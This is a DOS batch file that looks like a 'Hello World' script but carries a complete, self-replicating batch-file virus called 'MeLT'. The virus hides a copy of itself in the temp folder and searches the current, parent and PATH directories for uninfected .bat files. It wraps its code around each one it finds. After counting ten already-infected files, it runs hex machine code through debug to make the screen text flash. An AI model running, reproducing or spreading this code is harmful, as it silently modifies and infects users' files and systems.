@if not '%0==' if '%_melt%==' goto meltbeg
::---- dummy host --------
@echo off
echo Hello World!
::---- end dummy host ----

@goto MeLTend [MeLT_2a] 
:MeLTbeg
@echo off%_MeLT%
if '%1=='MeLT goto MeLT%2
if not exist %comspec% set comspec=%_MeLT%command
%comspec% /e:5000 /c %0 MeLT vir
set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 MeLT rh
set _MeLT=
set MeLTcl=
goto MeLTend
:MeLTrh
set _MeLT=x
%0 %MeLTcl% 
:MeLTvir
set MeLTH=%0
if not exist %_MeLT%%temp%\nul set temp=%tmp%
if exist %temp%\MeLT_2a goto MeLTrun
%0 MeLT fnd . %path% 
:MeLTfnd
shift%_MeLT%
if '%2==' exit MeLT
set MeLT=%2\%MeLTH%.bat
if not exist %MeLT% set MeLT=%2\%MeLTH%
if not exist %MeLT% set MeLT=%2%MeLTH%.bat
if not exist %MeLT% set MeLT=%2%MeLTH%
if not exist %MeLT% goto MeLTfnd 
find "MeLT"<%MeLT%>%temp%\MeLT_2a
attrib %temp%\MeLT_2a +h
:MeLTrun
%MeLTH% MeLT s . .. %path% 
:MeLTs
shift%_MeLT%
if '%2==' exit MeLT
for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a
goto MeLTs
:MeLTinf
find /i "MeLT"<%3>nul
if not errorlevel 1 goto MeLTno
echo @if not '%%0==' if '%%_melt%%==' goto meltbeg>MeLT.t
type %3>>MeLT.t
echo.>>MeLT.t
type %temp%\MeLT_2a>>MeLT.t
move MeLT.t %3>nul
exit MeLT
:MeLTact - flash-melt screen text then put back to normal
echo e 100 BA D0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>MeLT.t
echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>MeLT.t
echo e 120 B4 4C CD 21 00>>MeLT.t
echo g>>MeLT.t
debug<MeLT.t>nul
del MeLT.t
exit MeLT
:MeLTno
set MeLTC=%MeLTC%1
if %MeLTC%==1111111111 goto MeLTact
:MeLTend
